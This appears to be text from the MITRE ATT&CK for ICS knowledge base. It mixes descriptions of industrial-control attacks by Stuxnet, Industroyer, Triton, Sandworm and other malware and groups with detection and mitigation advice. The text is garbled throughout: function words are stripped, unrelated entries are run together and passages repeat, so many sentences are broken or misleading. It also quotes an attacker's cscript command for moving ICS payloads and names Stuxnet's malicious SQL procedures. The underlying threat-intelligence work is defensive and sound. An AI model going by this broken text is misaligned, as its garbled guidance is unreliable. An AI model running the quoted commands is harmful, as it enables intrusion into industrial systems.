 Ukraine 2015 Incident, [Sandworm Team](https://attack.mitre.org/groups/G0034) utilized HMI GUIs SCADA environment breakers. (Citation: Electricity Sharing Analysis Center; SANS Industrial Control Systems March 2016) [Dragonfly 2.0](https://attack.mitre.org/groups/G0035) trojanized legitimate software deliver malware disguised standard windows applications. (Citation: Symantec September 2017) [INCONTROLLER](https://attack.mitre.org/software/S1045) Telnet session load malware implant Omron PLCs.(Citation: CISA-AA22-103A)(Citation: Wylie-22)  Monitor application logs settings events network protocols block communications. Monitor device application logs operating mode changes, devices produce logs. Segment operational network systems restrict access critical functions predetermined management systems. (Citation: Department Homeland Security September 2016)
 Monitor devices configuration logs alerts program download occurred. Devices maintain application logs program download, online edit, program append function occurred. Protect files stored locally proper permissions limit opportunities adversaries interact collect databases. (Citation: Keith Stouffer 2015) (Citation: National Institute Standards Technology April 2013)
 [Stuxnet](https://attack.mitre.org/software/S0603) hardcoded password WinCC software's database server mechanisms propagate nearby systems. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) [Industroyer](https://attack.mitre.org/software/S0604) SIPROTEC DoS module exploits CVE-2015-5374 vulnerability render Siemens SIPROTEC device unresponsive. vulnerability restart shutdown device, device restarted manually resume operations. (Citation: Anton Cherepanov, ESET June 2017) Monitor device application logs firmware changes, devices produce logs. asset application logs provide I/O write commands. Monitor write commands excessive I/O manipulating single excessive times. verification distributed binaries hash checking integrity checking mechanisms. Scan downloads malicious signatures. Monitor newly executed processes aid sniffing network traffic capture environment. Monitor ICS management protocols / file transfer protocols protocol functions firmware changes. [Stuxnet](https://attack.mitre.org/software/S0603) infects DLL's WinCC Simatic manager responsible project files. user uninfected project file compromised manager, file infected Stuxnet code. infected project Simatic manager, modified data file trigger search `xyz.dll` file. `xyz.dll` file locations, malicious DLL loaded executed manager. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) [Industroyer](https://attack.mitre.org/software/S0604) port configuration file actual communication ports prevent processes accessing them. Thus, IEC 101 payload component maintain control RTU device. (Citation: Anton Cherepanov, ESET June 2017) Monitor loss network communications, device shutdown restarted. detect technique’s execution, provide additional evidence technique complement detections. Monitor firmware unexpected modifications settings data rootkits hide presence programs, files, network connections, services, drivers, components. Asset management systems consulted understand known-good firmware versions configurations. Provide operators redundant, out-of-band communication support monitoring control operational processes, recovering network outage  (Citation: National Institute Standards Technology April 2013). Out-of-band communication utilize diverse systems technologies minimize common failure modes vulnerabilities communications infrastructure. example, wireless networks 3G, 4G) provide diverse redundant delivery data.
 [Triton](https://attack.mitre.org/software/S1009) TriStations default UDP port, 1502, communicate devices. (Citation: MDudek-ICS) Monitor newly constructed processes assist lateral tool transfers, file transfer programs. Monitor application logs settings events network protocols block communications. Monitor unexpected deletion files. Ensure remote commands enable device shutdown disabled necessary. Examples include DNP3's 0x0D function code unnecessary device management functions.
 Detecting software exploitation difficult depending tools available. Software exploits succeed exploited process unstable crash, recorded application log. Device restarts shutdowns observable device application logs. Monitor unexpected device restarts shutdowns. Hot-standbys diverse locations ensure continued operations compromised unavailable. network layer, protocols Parallel Redundancy Protocol simultaneously redundant diverse communication local network. (Citation: M. Rentschler H. Heine)
 OPC, component [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) gathers details connected devices sends C2 attackers analyze. (Citation: Daavid Hentunen, Antti Tikkanen June 2014) Enforce policies physical restrictions limit hardware USB devices critical assets.
 difficult adversaries advance operation exploitation undiscovered unpatched vulnerabilities sandboxing. types virtualization application microsegmentation mitigate impact types exploitation. Risks additional exploits weaknesses systems exist. (Citation: Dan Goodin March 2017)
 Segment operational network systems restrict access critical functions predetermined management systems. (Citation: Department Homeland Security September 2016)
 [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) payload capability enumerating OPC tags, addition generic OPC server information. server data tag names provide names function control devices. (Citation: ICS-CERT August 2018) (Citation: Daavid Hentunen, Antti Tikkanen June 2014) Update software regularly employing patch management internal enterprise endpoints servers.
 [TEMP.Veles](https://attack.mitre.org/groups/G0088) valid credentials laterally moving RDP jump boxes ICS environment. (Citation: Dragos December 2017) Protect files stored locally proper permissions limit opportunities adversaries remove indicators activity system. (Citation: Keith Stouffer 2015) (Citation: National Institute Standards Technology April 2013)
 Monitor events scripting execution, loading modules scripting languages JScript.dll, vbscript.dll). [Triton](https://attack.mitre.org/software/S1009) read, write execute code memory safety controller arbitrary address devices firmware region. malware running firmware memory  modify device operates. (Citation: DHS CISA February 2019) Monitor loss operational process data alarms suppressed. detect technique’s execution, provide additional evidence technique complement detections. Monitor device alarms controller task parameters changed, devices produce alarms.
 
[Program Download](https://attack.mitre.org/techniques/T0843) enable technique. Monitor program downloads noticeable operational alarms. Asset management systems consulted understand expected program versions. [PLC-Blaster](https://attack.mitre.org/software/S1006) copies Program Organization Units (POU) target device.  POUs include Data Block, Function, Function Block. (Citation: Spenneberg, Ralf, Maik Brggemann, Hendrik Schwartke March 2016) [Sandworm Team](https://attack.mitre.org/groups/G0034) valid accounts laterally VPN connections dual-homed systems. (Citation: Dragos) (Citation: Dragos October 2018) Ukraine 2015 Incident, [Sandworm Team](https://attack.mitre.org/groups/G0034) credentials valid accounts interact client applications access employee workstations hosting HMI applications. (Citation: Electricity Sharing Analysis Center; SANS Industrial Control Systems March 2016) [Industroyer](https://attack.mitre.org/software/S0604) IEC 104 module 3 modes perform attack. modes range, shift, sequence. range mode operates 2 stages. stage range mode gathers Object Addresses (IOA) sends select execute packets switch state. stage range mode infinite loop switch discovered IOAs. Shift mode range mode, staying range, add shift default range values. (Citation: Anton Cherepanov, ESET June 2017) Regularly scan externally facing systems vulnerabilities establish procedures rapidly patch systems critical vulnerabilities discovered scanning public disclosure.
 Utilize code signatures verify integrity installed program safety control assets changed.
 Data industrial process operating expected bounds alarm setting changed. detect technique’s execution, provide additional evidence technique complement detections. Monitor firmware unexpected changes. Asset management systems consulted understand known-good firmware versions. Dump inspect BIOS images vulnerable systems compare images.(Citation: MITRE Copernicus) Analyze differences determine malicious occurred. Log attempts read/write BIOS compare patching behavior. Likewise, EFI modules collected compared known-clean list EFI executable binaries detect malicious modules. CHIPSEC framework analysis determine firmware modifications performed.(Citation: McAfee CHIPSEC Blog) (Citation: Github CHIPSEC) (Citation: Intel HackingTeam UEFI Rootkit) Update software regularly employing patch management internal enterprise endpoints servers.
 Monitor device application logs parameter changes, devices produce logs. Devices authenticate messages master outstation assets.
 Monitor logon sessions default credential use. [Sandworm Team](https://attack.mitre.org/groups/G0034) VBS script facilitate lateral tool transfer. VBS script ICS-specific payloads command: cscript C:\\Backinfo\\ufn.vbs  C:\\Backinfo\\101.dll C:\\Delta\\101.dll (Citation: Dragos October 2018) Set enforce secure password policies accounts.
 [Industroyer](https://attack.mitre.org/software/S0604) block serial channels temporarily causing denial control. (Citation: Anton Cherepanov, ESET June 2017) [Conficker](https://attack.mitre.org/software/S0608) infection nuclear power plant forced facility temporarily shutdown. (Citation: Catalin Cimpanu April 2016) Monitor newly constructed services/daemons Windows event logs event IDs 4697 7045. Hot-standbys diverse locations ensure continued operations compromised unavailable. network layer, protocols Parallel Redundancy Protocol simultaneously redundant diverse communication local network. (Citation: M. Rentschler H. Heine)
 Allow/denylists block access excessive I/O connections detected device time period.
 Network intrusion prevention systems systems designed scan remove malicious email attachments block activity.
 Monitor logon behavior abuse credentials existing accounts gaining Lateral Movement Persistence. Correlate security systems login user active login session entered building VPN access).  Integrating multi-factor authentication (MFA) organizational policy greatly reduce risk adversary gaining access valid credentials additional tactics initial access, lateral movement, collecting information. MFA restrict access cloud resources APIs.
  (Citation: Dragos) Segment operational network systems restrict access critical functions predetermined management systems. (Citation: Department Homeland Security September 2016)
 Monitor scheduled jobs attempt manipulate features artifacts legitimate benign users security tools. detecting collection shared network drives monitor unexpected abnormal accesses network shares. context adversary procedures background [Data Network Shared Drive](https://attack.mitre.org/techniques/T1039). Alterations service binary path service startup type changed disabled suspicious. [Industroyer](https://attack.mitre.org/software/S0604)'s data wiper component removes registry image path overwrites files, rendering unusable. (Citation: Anton Cherepanov, ESET June 2017) Anti-virus detect malicious documents files downloaded executed user's computer. Endpoint sensing network sensing detect malicious events file (such Word document PDF reaching internet spawning PowerShell). Monitor files (such /etc/hosts) accessed attempt listing systems IP address, hostname, logical identifier network Lateral Movement current system. [Triton](https://attack.mitre.org/software/S1009) file named TS_cnames.py default definitions program (TS_progstate). Program referenced TsHi.py.(Citation: MDudek-ICS)

[Triton](https://attack.mitre.org/software/S1009) file named TS_cnames.py default definitions key (TS_keystate). Key referenced TsHi.py.(Citation: MDudek-ICS) Monitor loss network communications, technique used. Monitor loss network communications, technique used. Detecting software exploitation difficult depending tools available. Software exploits succeed exploited process unstable crash. [Sandworm Team](https://attack.mitre.org/groups/G0034) appears MS-SQL access pivot machine, allowing code execution ICS network. (Citation: Dragos October 2018) protocol payloads, [Industroyer](https://attack.mitre.org/software/S0604) sends unauthorized commands RTUs change equipment. (Citation: Anton Cherepanov, ESET June 2017) Monitor file delete alter generated artifacts host system, including logs captured files quarantined malware. [Industroyer](https://attack.mitre.org/software/S0604) block serial channels temporarily causing denial view. (Citation: Anton Cherepanov, ESET June 2017) Prevent unauthorized systems accessing control servers field devices industrial information, services common automation protocols DNP3, OPC).
 Applications appliances utilize default username password changed installation, deployment production environment. (Citation: CISA June 2013)
 Monitor files accessed removable media, executable content. [Industroyer](https://attack.mitre.org/software/S0604) destructive wiper overwrites ICS configuration files hard drives mapped network drives targeting ABB PCM600 configuration files. (Citation: Dragos June 2017) Monitor newly constructed network connections service designed accept remote connections, RDP, Telnet, SSH, VNC. Monitor network connections involving common remote management protocols, ports tcp:3283 tcp:5900, ports tcp:3389 tcp:22 remote logins. adversary [Valid Accounts](https://attack.mitre.org/techniques/T0859) enable remote logins. host-based allowlists prevent devices accepting connections unauthorized systems. example, allowlists ensure devices connect master stations management/engineering workstations. (Citation: Department Homeland Security September 2016)
 Windows Unix systems monitor executed commands arguments commands execution. Shells common administrator, developer, power user systems depending job function.

On network device embedded CLIs reviewing command history unauthorized suspicious commands modify device configuration. Check integrity existing BIOS EFI determine vulnerable modification. Trusted Platform Module technology. (Citation: N/A)Move system's root trust hardware prevent tampering SPI flash memory. (Citation: ESET Whitepapers September 2018)Technologies Intel Boot Guard assist this. (Citation: Intel)
 [PLC-Blaster](https://attack.mitre.org/software/S1006) stops execution user program target enable transfer code. worm copies target subsequently starts target PLC again. (Citation: Spenneberg, Ralf, Maik Brggemann, Hendrik Schwartke March 2016) Monitor alarm setting observable automation management network protocols. [EKANS](https://attack.mitre.org/software/S0605) infection temporary production loss Honda manufacturing plant. (Citation: Davey Winder June 2020) [Industroyer](https://attack.mitre.org/software/S0604)'s data wiper component removes registry image path overwrites files, rendering unusable. (Citation: Anton Cherepanov, ESET June 2017) Monitor interactions network shares, reads file transfers, remote services Server Message Block (SMB). context adversary procedures background [Remote Services](https://attack.mitre.org/techniques/T1021) applicable sub-techniques. Segment operational network systems restrict access critical functions predetermined management systems. (Citation: Department Homeland Security September 2016)
 Patch BIOS EFI necessary.
 Minimize permissions access service accounts limit impact exploitation. (Citation: Keith Stouffer 2015)
 Monitor newly executed processes discover remote systems, ping.exe tracert.exe, executed quick succession.(Citation: Elastic - Koadiac Detection EQL) monitoring processes engaging scanning activity connecting multiple systems correlating process creation network data. Monitor Windows registry values disable services render services unavailable legitimate users. field controllers restrict modification programs users engineers, field technician), preferably implementing role-based access mechanism.
 Monitor logon sessions hardcoded credential use, feasible. utilizing jump boxes external remote access. Additionally, dynamic account management easily remove accounts use.
 Monitor file delete alter generated artifacts host system, including logs captured files quarantined malware. [Sandworm Team](https://attack.mitre.org/groups/G0034) actors exploited vulnerabilities GE's Cimplicity HMI Advantech/Broadwin WebAccess HMI software exposed internet. (Citation: ICS-CERT December 2014) (Citation: ICS CERT September 2018) removal remote services regularly use, enabling required vendor remote access). Ensure external remote access jump boxes, VPN concentrator) configured functionality, removal unnecessary services. (Citation: Department Homeland Security September 2016)
 Authenticate access field controllers authorizing access to, modification of, device's state, logic, programs. Centralized authentication techniques manage field controller accounts ICS.
 Utilize code signatures verify integrity installed program safety control assets changed.
 [Triton](https://attack.mitre.org/software/S1009) calls SafeAppendProgramMod transfer payloads Tricon. includes preforming program upload. (Citation: MDudek-ICS) Devices produce alarms restarts shutdowns. Monitor unexpected device restarts shutdowns. Monitor master devices communicating outstations, visible alarms ICS environment. Monitor newly executed processes disable services render services unavailable legitimate users. [Dragonfly 2.0](https://attack.mitre.org/groups/G0035) accessed workstations servers corporate network contained data power generation control environments. files ICS SCADA systems including vendor names ICS reference documents wiring diagrams panel layouts. (Citation: Cybersecurity & Infrastructure Security Agency March 2018) Engineering asset management software maintain expected program loaded controller record controller programs. Data platforms identify modified controller programs. [REvil](https://attack.mitre.org/software/S0496) malware gained access organizations network encrypted sensitive files OT equipment. (Citation: Selena Larson, Camille Singleton December 2020) host-based allowlists prevent devices accepting connections unauthorized systems. example, allowlists ensure devices connect master stations management/engineering workstations. (Citation: Department Homeland Security September 2016)
 [KillDisk](https://attack.mitre.org/software/S0607) deletes application, security, setup, event logs Windows systems. (Citation: Anton Cherepanov) Monitor network traffic anomalies AiTM behavior. Collection activity transmitted data manipulated, anomalies network management protocols ARP, DHCP). Application Firewalls limit exposure applications prevent exploit traffic reaching application. (Citation: Karen Scarfone; Paul Hoffman September 2009)
 Utilize network allowlists restrict unnecessary connections network devices comm servers, serial ethernet converters) services, devices limits simultaneous sessions support.
 Limit accounts remote services. Limit permissions accounts risk compromise; example, configure SSH users specific programs.
 Network connection enumeration common tools netstat, ipconfig).
 Monitor newly executed processes delete alter generated artifacts host system, including logs captured files quarantined malware. Hot-standbys diverse locations ensure continued operations compromised unavailable. network layer, protocols Parallel Redundancy Protocol simultaneously redundant diverse communication local network. (Citation: M. Rentschler H. Heine)
 Protocols device management authenticate network messages prevent unauthorized changes.
 Monitor logs installed applications historian logs) unexpected commands abuse features. deep packet inspection artifacts common exploit traffic, payloads. Monitor device alarms produced parameters changed, devices produce alarms. Monitor analyze traffic patterns packet inspection protocol(s), leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns  monitor anomalies files initiate connections respective protocol(s)). Network intrusion detection prevention systems identify traffic patterns indicative MiTM activity mitigate activity network level.
 Segment operational assets management devices based functional role process. Enabling strict isolation critical control operational control environment. (Citation: Karen Scarfone; Paul Hoffman September 2009) (Citation: Keith Stouffer 2015) (Citation: Department Homeland Security September 2016) (Citation: Dwight Anderson 2014) 
 Monitor loss expected device alarms alarms suppressed. technique description, multiple sources alarms ICS environment. Discrepancies alarms adversary suppressing alarms environment. detect technique’s execution, provide additional evidence technique complement detections. link visited user, network intrusion prevention systems systems designed scan remove malicious downloads block activity.
 [KillDisk](https://attack.mitre.org/software/S0607) delete files unbootable targets 35 types files deletion. (Citation: Anton Cherepanov) Ukraine 2015 Incident, [Sandworm Team](https://attack.mitre.org/groups/G0034) developed malicious firmware render communication devices inoperable. (Citation: Electricity Sharing Analysis Center; SANS Industrial Control Systems March 2016) ICS environments typically statically defined devices, minimize discovery protocols DHCP, LLDP) discovery functions automation protocols. (Citation: D. Parsons D. Wylie September 2019) (Citation: Colin Gray) Examples automation protocols discovery capabilities include OPC Device Discovery  (Citation: Josh Rinaldi April 2016), BACnet  (Citation: Aditya Sood July 2019), Ethernet/IP. (Citation: Langner November 2018)
 Techniques include (i) reducing transmission power wireless signals, (ii) adjusting antenna gain prevent extensions organizational boundaries, (iii) employing RF shielding techniques block excessive signal propagation. (Citation: DHS  National Urban Security Technology Laboratory April 2019)
 [TEMP.Veles](https://attack.mitre.org/groups/G0088) targeted ICS vendors manufacturers. (Citation: Dragos Threat Intelligence August 2019) [INCONTROLLER](https://attack.mitre.org/software/S1045)  CODESYS protocol upload programs Schneider PLCs.(Citation: Wylie-22)(Citation: Brubaker-Incontroller) 

[INCONTROLLER](https://attack.mitre.org/software/S1045)  existing program logic Omron PLCs program upload backup functions server.(Citation: Wylie-22)  Utilize strong cryptographic techniques protocols prevent eavesdropping network communications.
 [TEMP.Veles](https://attack.mitre.org/groups/G0088) utilizes watering hole websites target industrial employees. (Citation: Chris Bing 2018) devices systems changes, including administrative functions, require authentication. access management technologies enforce authorization management interface access attempts, device inherently provide strong authentication authorization functions.
 Monitor ICS management protocols parameter changes, including unexpected values, exceeding standard values, parameters changed unexpected function, unusual time). [KillDisk](https://attack.mitre.org/software/S0607) terminates non-standard processes, ICS application. (Citation: Anton Cherepanov) Limit access network infrastructure resources reshape traffic produce MiTM conditions.
 Monitor asset alarms identify loss communications. correlating alarms data sources traffic blocked, network traffic. alternative methods communicating outstations exist alarms visible command messages blocked. Purely passive network sniffing detected effectively. adversary interacts wireless network joining Wi-Fi network) detection possible. Monitor irregular network traffic flows unwanted devices sessions wireless networks.  Wi-Fi networks monitor rogue access signal strength, indicating device access expected physical layer signal.(Citation: Nzyme Alerts Intro) (Citation: Wireless Intrusion Detection)  Network traffic content provide context, hardware MAC) addresses, user accounts, types messages sent. Monitor services attempt manipulate features artifacts legitimate benign users security tools. Norsk Hydro's production systems impacted [LockerGoga](https://attack.mitre.org/software/S0372) infection. loss control forced company switch manual operations. (Citation: Kevin Beaumont) (Citation: Hydro) technique effectively mitigated against, controls assets processes lead technique.
 Preventing screen capture device require disabling calls supported operating systems WindowsGraphicsCaputer APIs), however, critical applications.
 [Sandworm Team](https://attack.mitre.org/groups/G0034) transfers executable files .txt. renames .exe, avoid detection extension tracking. (Citation: Dragos October 2018) Protocols control functions provide authenticity MAC functions digital signatures. not, utilize bump-in-the-wire devices VPNs enforce communication authenticity devices capable supporting legacy controllers, RTUs).
 detecting collection local systems monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent. Data acquired Windows management tools [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) [PowerShell](https://attack.mitre.org/techniques/T1059/001). context adversary procedures background [Data Local System](https://attack.mitre.org/techniques/T1005). Ensure applications devices store sensitive data credentials insecurely plaintext credentials code, published credentials repositories, credentials public cloud storage). (Citation: CISA June 2013)
 Perform audits scans systems, permissions, insecure software, insecure configurations, etc. identify potential weaknesses. Perform periodic integrity checks device validate correctness firmware, software, programs, configurations. Integrity checks, typically include cryptographic hashes digital signatures, compared valid states, events device reboots, program downloads, program restarts.
 Monitor unusual network traffic additional tools transferred system. network intrusion detection systems, SSL/TLS inspection, malicious scripts (recon, heap spray, browser identification scripts frequently reused), common script obfuscation, exploit code. Authenticate access field controllers authorizing access to, modification of, device's state, logic, programs. Centralized authentication techniques manage field controller accounts ICS.
 Monitor login sessions unexpected devices sessions wireless networks. Monitor network traffic originating unknown/unexpected systems. store data backups user systems critical servers. Ensure backup storage systems hardened separate corporate network prevent compromise.  Maintain exercise incident response plans  (Citation: Department Homeland Security October 2009), including management gold-copy back-up images configurations key systems enable quick recovery response adversarial activities impact control, view, availability.
 Update software control network assets possible. feasible, modern operating systems software reduce exposure vulnerabilities.
 field controllers restrict modification programs users engineers, field technician), preferably implementing role-based access mechanism.
 host-based allowlists prevent devices accepting connections unauthorized systems. example, allowlists ensure devices connect master stations management/engineering workstations. (Citation: Department Homeland Security September 2016)
 Ensure users user permissions roles Identity Access Management (IAM) controls prevent misuse. Implement user accounts individual access repositories role enforcement non-repudiation actions.
 Require signed binaries.
 Minimize permissions access service accounts limit exposed collected malicious users software. (Citation: National Institute Standards Technology April 2013)
 Filter protocols payloads program upload activity prevent unauthorized access device configurations.
 Routinely audit source code, application configuration files, repositories, public cloud storage insecure storage credentials.
 Devices authenticate messages master outstation assets.
 privilege service accounts. (Citation: Keith Stouffer 2015) (Citation: National Institute Standards Technology April 2013)
 [Stuxnet](https://attack.mitre.org/software/S0603) thread monitor data block DB890 sequence B. thread constantly running probing block (every 5 minutes). infected PLC, block DB890 special magic (used Stuxnet identify block DB890), blocks data read written. thread optimize sequences work, modify behavior Step7 editor opened. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) Apply DLP protect confidentiality operational processes, facility locations, device configurations, programs, databases infer organizational trade-secrets, recipes, intellectual property (IP).
 Authenticateconnections fromsoftware devices prevent unauthorized systems accessing protected management functions.
 [Stuxnet](https://attack.mitre.org/software/S0603) attempts contact command control servers port 80 send basic compromised. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) Deploy anti-virus systems support external email.
 Configure internal external firewalls block traffic common ports associate network protocols unnecessary network segment.
 [Stuxnet](https://attack.mitre.org/software/S0603) executes malicious SQL commands WinCC database server propagate remote systems. malicious SQL commands include xp_cmdshell, sp_dumpdbilog, sp_addextendedproc. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) Devices authenticate messages master outstation assets.
 Monitor unexpected files .pdf, .docx, .jpg) viewed collecting internal data. host-based allowlists prevent devices accepting connections unauthorized systems. example, allowlists ensure devices connect master stations management/engineering workstations. (Citation: Department Homeland Security September 2016)
 Monitoring screen capture behavior depend method data operating write output files. Detection methods include collecting unusual processes API calls image data, monitoring image files written disk, CopyFromScreen, xwd, screencapture.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware) data correlated events identify malicious activity, depending legitimacy behavior network environment. restricting access email critical process environments. Additionally, downloads attachments disabled email necessary.
 [Oldsmar Treatment Plant Intrusion](https://attack.mitre.org/campaigns/C0009), threat actors utilized operator HMI manipulate process control setpoint values normal operating levels.(Citation: Pinellas County Sheriffs Office February 2021) store data backups user systems critical servers. Ensure backup storage systems hardened separate corporate network prevent compromise.  Maintain exercise incident response plans  (Citation: Department Homeland Security October 2009), including management gold-copy back-up images configurations key systems enable quick recovery response adversarial activities impact control, view, availability.
 [EKANS](https://attack.mitre.org/software/S0605) masquerades valid executable filename update.exe. valid programs process update.exe perform background software updates. (Citation: Dragos Threat Intelligence February 2020) [Industroyer](https://attack.mitre.org/software/S0604) automatically collects protocol object data learn control devices environment. (Citation: Anton Cherepanov, ESET June 2017) Monitor suspicious account behavior systems share accounts, user, admin, service accounts. Examples: account logged multiple systems simultaneously; multiple accounts logged machine simultaneously; accounts logged odd times business hours. Activity interactive login sessions process ownership accounts execute binaries remote account. Firewalls proxies inspect URLs known-bad domains parameters. reputation-based analytics websites requested resources domain is, registered to, bad list, users connected before. [OilRig](https://attack.mitre.org/groups/G0049) embedded macro spearphishing attachments VBScript PowerShell script.(Citation: Robert Falcone, Bryan Lee 2016) [WannaCry](https://attack.mitre.org/software/S0366) initially infected networks, exploit (particularly SMBv1-targeting MS17-010 vulnerability) spread industrial networks. (Citation: Joe Slowik April 2019) Ensure wired wireless traffic encrypted feasible. practices authentication protocols, Kerberos, ensure traffic credentials protected SSL/TLS. (Citation: Keith Stouffer 2015)
 Spoofed reporting messages detected reviewing content automation protocols, detecting based expected values comparing band process data sources. Spoofed messages precisely match legitimate messages lead malformed traffic, traffic malformed benign reasons. Monitor reporting messages constructed.

Various techniques enable spoofing reporting message. monitoring [Rogue Master](https://attack.mitre.org/techniques/T0848) [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T0830) activity. store data backups user systems critical servers. Ensure backup storage systems hardened separate corporate network prevent compromise.  Maintain exercise incident response plans  (Citation: Department Homeland Security October 2009), including management gold-copy back-up images configurations key systems enable quick recovery response adversarial activities impact control, view, availability.
 [Stuxnet](https://attack.mitre.org/software/S0603) reprogram PLC change critical parameters legitimate commands overridden intercepted. addition, Stuxnet apply inappropriate command sequences parameters damage property. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) Utilize network allowlists restrict unnecessary connections network devices comm servers, serial ethernet converters) services, devices limits simultaneous sessions support.
 Monitor newly executed processes depend user interaction, applications embed programmatic capabilities Office products scripts, installers, zip files). includes compression applications, zip files, [Deobfuscate/Decode Files Information](https://attack.mitre.org/techniques/T1140) payloads. Implement continuous monitoring vulnerability sources. Also, automatic manual code review tools. (Citation: OWASP)
 Network intrusion detection prevention systems network signatures identify traffic specific adversary malware unusual data transfer tools protocols FTP mitigate activity network level. Signatures unique indicators protocols based specific obfuscation technique adversary tool malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: Gardiner, J.,  Cova, M., Nagaraja, February 2014)
 Monitor unexpected connections controllers, Unauthorized Command Message [Rogue Master](https://attack.mitre.org/techniques/T0848). [Industroyer](https://attack.mitre.org/software/S0604) port configuration file actual communication ports prevent processes accessing them. Thus, IEC 101 payload component maintain control RTU device. (Citation: Anton Cherepanov, ESET June 2017) rest, project files encrypted prevent unauthorized changes. (Citation: National Institute Standards Technology April 2013)
 Monitor mail server proxy logs evidence messages originating spoofed addresses, including records indicating failed DKIM+SPF validation mismatched message headers.(Citation: Anti Spoofing)(Citation: ACSC Email Spoofing) Anti-virus detect malicious documents attachments scanned stored email server user's computer. Segment operational assets management devices based functional role process. Enabling strict isolation critical control operational control environment. (Citation: Karen Scarfone; Paul Hoffman September 2009) (Citation: Keith Stouffer 2015) (Citation: Department Homeland Security September 2016) (Citation: Dwight Anderson 2014) 
 [Sandworm Team](https://attack.mitre.org/groups/G0034) utilized VBS batch scripts file movement wrappers PowerShell execution. (Citation: Dragos October 2018) [VPNFilter](https://attack.mitre.org/software/S1010)'s ssler module configures device's iptables redirect traffic destined port 80 local service listening port 8888. outgoing requests port 80 intercepted ssler inspected ps module manipulated legitimate service. (Citation: William Largent June 2018) (Citation: Carl Hurd March 2019) supply chain management program include methods assess trustworthiness technical maturity supplier, technical methods code-signing, materials) validate integrity newly devices components. Develop procurement language emphasizes expectations suppliers artifacts, audit records, technical capabilities validate integrity devices supply chain. (Citation: Robert A. Martin January 2021)
 Network allowlists implemented host-based files host files external connections IP address, MAC address, port, protocol) device. Allowlist techniques operate application layer DNP3, Modbus, HTTP) addressed [Filter Network Traffic](https://attack.mitre.org/mitigations/M0937) mitigation. Access Management technologies enforce authentication critical remote service, examples include, limited to, device management services telnet, SSH), data access servers HTTP, Historians), HMI sessions RDP, VNC).
 [REvil](https://attack.mitre.org/software/S0496) sends HTTPS POST messages randomly generated URLs communicate remote server. (Citation: Tom Fakterman August 2019) (Citation: SecureWorks September 2019) Provide alternative method alarms reported event communication failure.
 [ACAD/Medre.A](https://attack.mitre.org/software/S1000) collects AutoCAD application. worm collects AutoCAD (*.dwg) files drawings repositories. (Citation: ESET)
 Monitor processes spawning command applications PowerShell, Bash). Benign activity allow-listed. gaining additional insight adversaries' actions native processes custom tools. [Industroyer](https://attack.mitre.org/software/S0604)'s OPC module brute force values send 0x01 status target systems equates Primary Variable Limits misdirecting operators understanding protective relay status. (Citation: Anton Cherepanov, ESET June 2017) Built-in browser sandboxes application isolation web-based malware.
 Ensure unnecessary ports services closed prevent risk discovery potential exploitation.
 Application denylists block automation protocol functions initiate device shutdowns restarts, DNP3's 0x0D function code, vulnerabilities trigger device shutdowns CVE-2014-9195, CVE-2015-5374).
 [VPNFilter](https://attack.mitre.org/software/S1010) packet sniffer basic authentication monitors ICS traffic, specific TP-LINK R600-VPN. malware raw socket connections pre-specified IP address, TCP packets 150 bytes larger. Packets port 502, scanned BasicAuth, logged. allowed credential harvesting communications devices accessing modbus-enabled HMI. (Citation: William Largent June 2018) (Citation: Carl Hurd March 2019) Utilize code signatures verify integrity installed program safety control assets changed.
 [Stuxnet](https://attack.mitre.org/software/S0603) infects PLCs code depending characteristics target system. infection sequence consists code blocks data blocks downloaded PLC alter behavior. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) Encrypt operational data strong confidentiality requirements, including organizational trade-secrets, recipes, intellectual property (IP).
 [INCONTROLLER](https://attack.mitre.org/software/S1045) ability exploit vulnerable Asrock driver (AsrDrv103.sys) CVE-2020-15368 load unsigned driver system.(Citation: Wylie-22) tools restrict program execution application control attributes file common application utilities.
 Monitor DLL file events, creation binary files loading DLLs processes remote graphical connections, RDP VNC. [Remote Services](https://attack.mitre.org/techniques/T0886) access host’s GUI. [Stuxnet](https://attack.mitre.org/software/S0603) infects OB1 malicious code sequence executed start cycle. infects OB35. OB35 acts watchdog, conditions, execution OB1. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) [Triton](https://attack.mitre.org/software/S1009)'s injector, inject.bin, function pointer 'get main processor diagnostic data' TriStation command address imain.bin executed prior normal handler. (Citation: Jos Wetzels January 2018) Implement network allowlists minimize serial comm port access authorized hosts, comm servers RTUs.
 detecting collection centralized repositories monitor third-party application logging, messaging, artifacts leverage repositories valuable information. repositories considerably user base, detection malicious non-trivial. minimum, access repositories performed privileged users (for example, Active Directory Domain, Enterprise, Schema Administrators) closely monitored alerted upon, types accounts access repositories. capability exists, monitor alert users retrieving viewing documents pages; behavior indicative programmatic retrieve data repository. environments high-maturity, leverage User-Behavioral Analytics (UBA) platforms detect alert user-based anomalies. context adversary procedures background [Data Repositories](https://attack.mitre.org/techniques/T1213). host-based allowlists prevent devices accepting connections unauthorized systems. example, allowlists ensure devices connect master stations management/engineering workstations. (Citation: Department Homeland Security September 2016)
 Monitor anomalous unexpected commands result process operation discrete write, logic device configuration, mode changes) observable asset application logs. Engineering asset management software maintain expected program loaded controller record controller programs tasks. Data platforms identify modified controller tasking. Monitor unexpected ICS protocol functions existing devices. Monitoring devices requires ICS function level insight determine unauthorized device issuing commands historian). encryption firmware considered prevent adversaries identifying vulnerabilities firmware.
 Monitor application logs unexpected devices sessions wireless networks. Perform inline allowlisting automation protocol commands  prevent devices sending unauthorized command reporting messages. Allow/denylist techniques designed sufficient accuracy prevent unintended blocking valid reporting messages.
 Disable unnecessary legacy network protocols MiTM applicable.
